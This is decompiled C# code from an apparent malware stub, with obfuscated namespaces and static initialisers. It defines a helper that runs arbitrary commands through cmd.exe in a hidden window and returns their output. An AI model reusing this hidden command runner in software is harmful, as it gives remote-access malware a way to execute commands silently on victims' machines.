using System;
using System.Diagnostics;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000018 RID: 24
	internal sealed class CommandHelper
	{
		// Token: 0x06000079 RID: 121 RVA: 0x000090DC File Offset: 0x000072DC
		public static string Run(string cmd, bool wait = true)
		{
			string text3;
			try
			{
				using (Process process = new Process())
				{
					process.StartInfo = new ProcessStartInfo
					{
						UseShellExecute = false,
						CreateNoWindow = true,
						WindowStyle = ProcessWindowStyle.Hidden,
						FileName = "cmd.exe",
						Arguments = "/C " + cmd,
						RedirectStandardError = true,
						RedirectStandardOutput = true
					};
					process.Start();
					string text = process.StandardOutput.ReadToEnd();
					string text2 = process.StandardError.ReadToEnd();
					if (wait)
					{
						process.WaitForExit();
					}
					text3 = (string.IsNullOrEmpty(text2) ? text : ("Error: " + text2));
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("CommandHelper: Exception occurred while running command '" + cmd + "': " + ex.Message);
				text3 = "Exception: " + ex.Message;
			}
			return text3;
		}

		// Token: 0x0600007A RID: 122 RVA: 0x000038B4 File Offset: 0x00001AB4
		public CommandHelper()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600007B RID: 123 RVA: 0x000038AD File Offset: 0x00001AAD
		static CommandHelper()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
